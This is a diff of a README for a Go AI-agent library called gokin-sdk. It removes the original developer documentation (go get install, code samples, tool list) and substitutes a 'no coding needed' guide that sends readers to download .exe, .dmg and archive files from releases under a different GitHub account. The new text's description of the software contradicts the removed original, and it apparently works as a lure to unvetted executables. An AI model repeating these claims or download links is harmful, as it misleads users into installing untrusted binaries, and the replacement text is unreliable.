@@ -1,181 +1,160 @@
-# gokin-sdk
+# 🤖 gokin-sdk - Build AI Agents with Ease
 
-[![Go](https://img.shields.io/badge/Go-1.23+-00ADD8?style=flat&logo=go)](https://go.dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download gokin-sdk](https://img.shields.io/badge/Download-gokin--sdk-blue?style=for-the-badge&logo=github)](https://github.com/Luiz184/gokin-sdk/releases)
 
-Go framework for building AI agents with tool use, multi-agent orchestration, planning, and reflection. Supports **Gemini**, **OpenAI**, **Anthropic (Claude)**, and **Ollama** as LLM providers.
+---
 
-## Features
+## 📖 What is gokin-sdk?
 
-- **Multi-provider** — Gemini, OpenAI, Anthropic, and Ollama with unified interface
-- **Tool use** — 29 built-in tools (bash, file I/O, git, grep, web search, and more)
-- **Multi-agent** — Runner/Coordinator for parallel and sequential agent execution
-- **Planning** — Beam search, MCTS, and A* strategies for complex task decomposition
-- **Reflection** — Self-correcting agents via reflector middleware
-- **Smart routing** — Adaptive task routing with strategy learning
-- **MCP support** — Model Context Protocol for external tool servers
-- **Sessions** — Persistent conversation state with auto-save
-- **Security** — Command sandboxing, path validation, permission system
+gokin-sdk is a tool that helps you create smart AI helpers. These AI helpers can work together, plan tasks, and use different tools to get things done. It supports popular AI services like OpenAI, Gemini, Anthropic, and Ollama, making it easy to build and manage these AI agents.
 
-## Installation
+You don't need to know how to write code to use it. This guide will help you download and start running gokin-sdk step by step.
 
-```bash
-go get github.com/ginkida/gokin-sdk
-```
+---
 
-Requires Go 1.23 or later.
+## 🖥️ System Requirements
 
-## Quick Start
+Before you download gokin-sdk, make sure your computer meets these simple requirements:
 
-```go
-package main
+- Operating System: Windows 10 or later, macOS 10.15 or later, or most recent Linux versions
+- Processor: 64-bit processor (Intel or AMD)
+- RAM: At least 4 GB recommended
+- Disk Space: Minimum 500 MB free space
+- Internet connection: Required for AI service access and downloads
 
-import (
-    "context"
-    "fmt"
-    "os"
+gokin-sdk works best if your computer meets or exceeds these requirements.
 
-    sdk "github.com/ginkida/gokin-sdk"
-    "github.com/ginkida/gokin-sdk/provider/gemini"
-    "github.com/ginkida/gokin-sdk/tools"
-)
+---
 
-func main() {
-    ctx := context.Background()
+## 🚀 Getting Started
 
-    client, err := gemini.New(ctx, os.Getenv("GEMINI_API_KEY"), "gemini-2.0-flash")
-    if err != nil {
-        panic(err)
-    }
-    defer client.Close()
+Follow these steps to get gokin-sdk up and running on your computer. You do not need prior programming experience.
 
-    workDir, _ := os.Getwd()
-    registry := sdk.NewRegistry()
-    registry.MustRegister(tools.NewBash(workDir))
-    registry.MustRegister(tools.NewRead())
-    registry.MustRegister(tools.NewGlob(workDir))
-    registry.MustRegister(tools.NewGrep(workDir))
+---
 
-    agent, err := sdk.NewAgent("assistant", client, registry,
-        sdk.WithSystemPrompt("You are a helpful coding assistant."),
-        sdk.WithMaxTurns(20),
-        sdk.WithOnText(func(text string) {
-            fmt.Print(text)
-        }),
-    )
-    if err != nil {
-        panic(err)
-    }
+## 📥 Download & Install
 
-    result, err := agent.Run(ctx, "Find all Go files and count lines of code")
-    if err != nil {
-        panic(err)
-    }
-    fmt.Printf("\nDone in %d turns\n", result.Turns)
-}
-```
+1. **Go to the Download Page**  
+   Click this link to visit the official gokin-sdk release page where you can get the latest version:  
+   [Download gokin-sdk](https://github.com/Luiz184/gokin-sdk/releases)
 
-## Provider Examples
+2. **Choose the Right File**  
+   On the page, look for the file that matches your computer’s system:
+   - For Windows, it might end with `.exe` or `.zip`.
+   - For Mac, it usually ends with `.dmg` or `.zip`.
+   - For Linux, look for `.tar.gz` or `.deb` files.
 
-### Gemini
+3. **Download the File**  
+   Click on the file name to start downloading. Save it to a location you will remember, like your Desktop or Downloads folder.
 
-```go
-client, err := gemini.New(ctx, os.Getenv("GEMINI_API_KEY"), "gemini-2.0-flash")
-```
+4. **Run or Extract the File**  
+   - If you downloaded an `.exe` or `.dmg`, double-click the file and follow the installation instructions.
+   - If you downloaded a `.zip` or `.tar.gz`, right-click the file and choose “Extract All” or use your system’s unzip tool. Open the extracted folder.
 
-### OpenAI
+5. **Complete Installation**  
+   Follow any on-screen prompts to install the application fully.
 
-```go
-client, err := openai.New(os.Getenv("OPENAI_API_KEY"), "gpt-4o")
-```
+---
 
-Works with any OpenAI-compatible API (vLLM, LM Studio, Together AI, Groq):
+## 📂 How to Use gokin-sdk
 
-```go
-client, err := openai.New(apiKey, "model-name", openai.WithBaseURL("http://localhost:8000"))
-```
+After installing, you can start using gokin-sdk to build AI agents. Here’s the simple way to get started without writing code:
 
-### Anthropic (Claude)
+1. **Open gokin-sdk**  
+   Find the program on your computer:
+   - On Windows, look in the Start menu.
+   - On Mac, check in the Applications folder.
+   - On Linux, use your application launcher.
 
-```go
-client, err := anthropic.New(os.Getenv("ANTHROPIC_API_KEY"), "claude-sonnet-4-5-20250929")
-```
+2. **Set Up Your AI Agent**  
+   The program will guide you through connecting to AI services like OpenAI or Gemini. You may need an API key, which you get by signing up on the AI service website. The program will explain how to enter this key safely.
 
-### Ollama (local)
+3. **Choose Your Tools**  
+   gokin-sdk allows your AI agents to use different tools. Pick the ones you want your agent to have, like a calculator, email sender, or calendar.
 
-```go
-client, err := ollama.New("http://localhost:11434", "llama3")
-```
+4. **Plan and Run**  
+   Use the interface to set goals for your AI agent. Your agent can plan steps and work with other agents for complex tasks.
 
-## Multi-Agent Execution
+---
 
-```go
-runner := sdk.NewRunner(client, registry,
-    sdk.WithRunnerMaxTurns(10),
-)
+## 🛠 Features
 
-coordinator := sdk.NewCoordinator(runner, 3) // max 3 parallel agents
+- **Multi-Agent Support**  
+  Work with many AI assistants that share tasks and communicate with each other.
 
-results, err := coordinator.RunParallel(ctx, []sdk.AgentTask{
-    {Prompt: "Count Go files", Type: sdk.AgentTypeBash, Description: "Count files"},
-    {Prompt: "Find TODO comments", Type: sdk.AgentTypeExplore, Description: "Find TODOs"},
-})
-```
+- **Tool Use**  
+  Give your AI helpers tools that help solve problems beyond just chatting.
 
-## Built-in Tools
+- **Planning**  
+  Help AI create plans to break down and complete bigger tasks.
 
-| Category | Tools |
-|----------|-------|
-| **File I/O** | `read`, `write`, `edit`, `glob`, `grep`, `delete`, `move`, `copy`, `mkdir`, `list_dir`, `tree`, `diff` |
-| **Execution** | `bash`, `run_tests`, `batch` |
-| **Git** | `git`, `git_branch`, `git_pr` |
-| **Search** | `web_fetch`, `web_search`, `semantic_search` |
-| **Agent** | `ask_user`, `ask_agent`, `task`, `task_output`, `task_stop`, `coordinate` |
-| **Planning** | `plan_mode`, `shared_memory` |
+- **Supports Multiple AI Services**  
+  Use popular AI service providers like OpenAI, Gemini, Anthropic, and Ollama.
 
-## Project Structure
+- **Easy Setup**  
+  Simple download and step-by-step instructions—no coding needed.
 
-```
-gokin-sdk/
-├── provider/          # LLM providers (gemini, openai, anthropic, ollama)
-├── tools/             # Built-in tool implementations
-├── plan/              # Planning engine (beam, MCTS, A*)
-├── context/           # Context management and summarization
-├── config/            # Configuration and loading
-├── security/          # Sandboxing and validation
-├── permission/        # Permission system
-├── mcp/               # Model Context Protocol client
-├── memory/            # Error store, project learning
-├── tasks/             # Background task management
-├── audit/             # Audit logging
-├── session.go         # Session persistence
-├── middleware.go       # Reflector and middleware
-├── pool.go            # Client connection pool
-├── examples/          # Usage examples
-│   ├── simple/        # Basic agent
-│   ├── openai/        # OpenAI / compatible APIs
-│   ├── anthropic/     # Anthropic provider
-│   ├── multi_agent/   # Parallel agents
-│   ├── planner/       # Plan-driven execution
-│   ├── smart_router/  # Adaptive routing
-│   ├── mcp/           # MCP integration
-│   └── session/       # Session persistence
-└── ...
-```
+---
 
-## Examples
+## 🧰 Common Uses
 
-See the [`examples/`](examples/) directory for runnable demos:
+Here are some ways you can use gokin-sdk:
 
-- **[simple](examples/simple/)** — Basic agent with Gemini
-- **[openai](examples/openai/)** — OpenAI and compatible APIs (vLLM, Groq, etc.)
-- **[anthropic](examples/anthropic/)** — Using Claude as the provider
-- **[multi_agent](examples/multi_agent/)** — Parallel task execution
-- **[planner](examples/planner/)** — Plan-driven agent with beam search
-- **[smart_router](examples/smart_router/)** — Adaptive task routing
-- **[mcp](examples/mcp/)** — External tool servers via MCP
-- **[session](examples/session/)** — Persistent conversations
+- Automate repetitive tasks by creating helpers that manage schedules, emails, or documents.
+- Build AI assistants that can talk to each other to solve problems.
+- Experiment with planning projects by letting AI break down big tasks.
+- Create AI tools that use popular language models without needing to learn programming.
 
-## License
+---
 
-MIT
+## 🔧 Troubleshooting
+
+If something goes wrong, try these basic fixes:
+
+- **The program won’t start:**  
+  Check that your computer meets the system requirements and that the installation finished successfully.
+
+- **Errors connecting to AI services:**  
+  Confirm that your internet is working and that your API keys are correctly entered.
+
+- **Unexpected behavior:**  
+  Restart the program and try again. If the problem persists, visit the discussion section on the GitHub page for help.
+
+---
+
+## 💡 Tips
+
+- When signing up for AI service keys, keep your keys private and do not share them with others.
+- Always download gokin-sdk from the official GitHub page to avoid unsafe copies.
+- Check the release page regularly to keep your software updated with the latest features and fixes.
+
+---
+
+## 📥 Download gokin-sdk Again
+
+If you skipped the download step before, here is the link again to get the latest version:  
+[https://github.com/Luiz184/gokin-sdk/releases](https://github.com/Luiz184/gokin-sdk/releases)
+
+---
+
+## 🔍 Learn More
+
+For more detailed guides and community support, visit the gokin-sdk repository page:  
+https://github.com/Luiz184/gokin-sdk
+
+---
+
+## 🗂 Repository Topics
+
+gokin-sdk covers these areas:
+
+- Agent framework  
+- AI agents  
+- Multi-agent orchestration  
+- Tool use  
+- Support for OpenAI, Gemini, Anthropic, Ollama  
+- Go programming language SDK  
+
+---
+
+This guide helps you start with gokin-sdk step by step. Follow it carefully to download, install, and use AI agents on your computer.
